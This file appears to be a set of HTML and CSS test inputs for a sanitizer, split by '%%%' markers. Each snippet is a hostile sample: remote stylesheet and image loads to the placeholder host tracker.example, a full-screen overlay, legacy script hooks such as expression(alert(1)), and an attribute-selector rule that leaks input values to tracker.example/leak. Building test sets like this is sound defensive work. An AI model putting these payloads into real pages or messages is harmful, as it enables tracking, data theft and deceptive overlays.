<style>@import url(https://tracker.example/x.css); body { background: url(https://tracker.example/b.png) }</style>
%%%
<p style="background:url(https://tracker.example/s.png)">inline url</p>
%%%
<div style="position:fixed;inset:0;z-index:99999;background:white">overlay</div>
%%%
<p style="behavior:url(x.htc);-moz-binding:url(x.xml#y);width:expression(alert(1))">legacy</p>
%%%
<link rel="stylesheet" href="https://tracker.example/l.css">
%%%
<style>input[value^="a"] { background: url(https://tracker.example/leak?a) }</style>
%%%
<font face="x" color="red" style="font-family:url(https://tracker.example/f.woff)">font</font>
%%%
<table background="https://tracker.example/t.png"><tr><td background="https://tracker.example/td.png">cell</td></tr></table>
